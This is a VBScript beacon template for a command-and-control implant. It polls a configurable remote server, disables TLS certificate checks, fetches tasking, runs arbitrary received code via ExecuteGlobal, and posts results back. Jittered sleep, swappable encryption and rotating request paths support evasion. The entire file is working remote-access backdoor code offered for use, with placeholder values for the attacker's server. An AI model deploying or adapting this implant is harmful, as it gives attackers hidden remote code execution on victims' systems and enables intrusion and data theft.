' A template made for global dynamic execution.
' Executing EXECVBS tasking will call ExecuteGlobal, running the supplied VBS in the global
' namespace of this script. This is then used to (re)define functions and set variables,
' instead of using regex to parse text tasking.
'
' When doing dynamic execution:
'   + Set the Results variable to your return value, to receive the results as a POST.
'   + Redefine the Decrypt/Encrypt functions to do additional encryption and change keys. 
'   + Reset RequestPath to continue jumping through different URL paths.
'   + Set Break to True to terminate this script.
'
' Here is an excellent resource of useful things you could probably inject:
'    https://www.robvanderwoude.com/vbstech.php
'
' Oh, I do not know if this works yet, so use at own risk.

' Uncomment below to skip breaking on errors - done for debugging; should be uncommented.
'On Error Resume Next
Break = False
UUID = "<client_uuid_00000000-0000-0000-0000-000000000000>"
RequestPath = "<registered_uri_path>"
Server = "<server_host_name_example.com>"
Port = "<server_port_443>"
HttpLabel = "<http_prefix>://"
MinWait = <min_wait_5000>
MaxWait = <max_wait_8000>
UserAgent = "<client_user_agent>"
Set ExecVbsRe = New RegExp: ExecVbsRe.Pattern = "<EXECVBS><VBS:((.|\n)+)>$"
Results = ""
CallbackCount = 0
BadResponseCount = 0
BadResponseLimit = 5
Function Decrypt(Input)
    Decrypt = Input
End Function
Function Encrypt(Input)
    Encrypt = Input
End Function
Do While True
    Command = ""
    Set XmlHttpReq = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    XmlHttpReq.setOption 2, SXH_SERVER_CERT_IGNORE_ALL_SERVER_ERRORS
    If Len(Results) = 0 Then
        XmlHttpReq.Open "GET", HttpLabel & Server & ":" & Port & RequestPath, false
    Else
        XmlHttpReq.Open "POST", HttpLabel & Server & ":" & Port & RequestPath, false
    End If
    CallbackCount = CallbackCount + 1
    XmlHttpReq.setRequestHeader "User-Agent", UserAgent
    XmlHttpReq.setRequestHeader "_user", UUID
    XmlHttpReq.setRequestHeader "_x", 2
    XmlHttpReq.setRequestHeader "_y", CallbackCount
    If Len(Results) = 0 Then
        XmlHttpReq.Send
    Else
        XmlHttpReq.Send(Encrypt(Results))
        Results = ""
    End If
    Command = Decrypt(XmlHttpReq.responseText)
    Set XmlHttpReq = Nothing
    If Command = "" Then
        BadResponseCount = BadResponseCount + 1
    Else
        BadResponseCount = 0
    End If
    If ExecVbsRe.Test(Command) Then
        For Each MatchObj in ExecVbsRe.Execute(Command)
            ExecuteGlobal MatchObj.Submatches(0)
        Next
    End If
    If BadResponseCount >= BadResponseLimit Or Break Then
        Exit Do
    End If
    If Len(Results) = 0 Then
        Randomize
        WScript.Sleep(Int((MaxWait-MinWait+1)*Rnd+MinWait))
    End If
Loop
